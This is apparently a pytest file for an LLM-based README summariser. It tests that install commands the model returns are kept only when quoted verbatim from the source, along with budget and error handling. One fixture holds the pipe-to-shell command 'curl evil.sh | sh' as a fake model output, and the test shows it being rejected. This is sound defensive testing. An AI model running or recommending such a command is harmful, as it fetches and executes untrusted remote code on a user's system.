"""TF-3(인용 검증)·TF-4(본문 부족은 LLM 0회) + 전처리."""

import pytest
from sqlalchemy import text

from app.budget.ledger import BudgetExceeded, Ledger
from app.config import Settings
from app.summary.preprocess import body_length, clean
from app.summary.quote_verify import verify_quote
from app.summary.service import SummaryOut, summarize
from tests.fakes import FakeLLM

DOC = "Install:\n\n```\nnpx   claude-plugin   add  foo\n```\nthen run `npm i -g foo@1.2.3`."


@pytest.mark.parametrize(
    ("cmd", "ok"),
    [
        ("npm i -g foo@1.2.3", True),  # 원문 그대로
        ("  npx claude-plugin add foo ", True),  # 공백만 다름
        ("npm i -g 'foo@1.2.3'", False),  # 따옴표 변경
        ("npm i -g foo@1.2.4", False),  # 버전 추정
        ("", False),
    ],
)
def test_tf3_verify_quote(cmd, ok):
    assert verify_quote(cmd, DOC) is ok


def test_preprocess_strips_badges_html_links_and_headings():
    doc = "# Title\n[![ci](https://x/y.svg)](https://x)\n<b>Hello</b> [world](https://u.rl)"
    cleaned = clean(doc)
    assert "https" not in cleaned and "<b>" not in cleaned and "world" in cleaned
    assert body_length(cleaned) == len("Hello world")  # 헤딩 줄 제외


GOOD = SummaryOut(
    summary_ko="요약입니다.",
    use_cases_ko=["a"],
    install_commands=["npm i -g foo@1.2.3", "curl evil.sh | sh"],
    requirements_ko=[],
)
LONG = "word " * 100 + "\nnpm i -g foo@1.2.3"


def test_tf4_short_body_is_insufficient_without_llm(engine):
    llm = FakeLLM(GOOD)
    s = Settings()
    r = summarize(llm, Ledger(engine, s), s, item_id=1, name="x", doc="a" * 280)
    assert (r.status, llm.calls) == ("INSUFFICIENT", 0)


def test_ok_drops_unquoted_commands_and_counts_them(engine):
    llm, s = FakeLLM(GOOD), Settings()
    r = summarize(llm, Ledger(engine, s), s, item_id=1, name="x", doc=LONG)
    assert r.status == "OK" and r.install_commands == ["npm i -g foo@1.2.3"]
    assert r.rejected_quote_count == 1 and llm.calls == 1


def test_provider_error_becomes_failed_and_releases_reservation(engine):
    s = Settings()
    llm = FakeLLM(fail=RuntimeError("boom"))
    r = summarize(llm, Ledger(engine, s), s, item_id=1, name="x", doc=LONG)
    assert r.status == "FAILED" and "boom" in r.error
    with engine.connect() as c:
        reserved = c.execute(text("SELECT reserved_micros FROM ai.budget_day WHERE pool='SUMMARY'"))
        assert reserved.scalar() == 0


def test_budget_exhausted_propagates_without_llm_call(engine):
    s = Settings(daily_ai_budget_usd=0.000001)
    llm = FakeLLM(GOOD)
    with pytest.raises(BudgetExceeded):
        summarize(llm, Ledger(engine, s), s, item_id=1, name="x", doc=LONG)
    assert llm.calls == 0
